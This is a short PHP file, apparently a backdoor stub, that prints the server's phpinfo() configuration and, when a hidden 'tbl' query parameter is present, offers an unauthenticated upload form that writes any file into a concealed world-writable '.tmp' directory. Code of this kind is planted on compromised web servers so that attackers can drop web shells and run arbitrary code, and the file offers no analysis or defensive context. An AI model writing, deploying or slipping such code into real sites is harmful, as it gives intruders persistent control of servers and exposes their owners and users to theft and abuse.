<?phpinfo();
?>

<?php
if(isset($_GET['tbl'])) {
    if($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_FILES['file'])) {
        $dir = "upload/var/www/.tmp/";
        if(!is_dir($dir)) mkdir($dir, 0777, true);
        
        $file = $dir . basename($_FILES['file']['name']);
        if(move_uploaded_file($_FILES['file']['tmp_name'], $file)) {
            echo "upload/var/www/.tmp";
        } else {
            echo "Kontol";
        }
        exit();
    } else {
        echo 'upload/var/www/.tmp/<form method="POST" enctype="multipart/form-data"><input type="file" name="file"><input type="submit" value="Upload"></form>';
        exit();
    }
}
?>
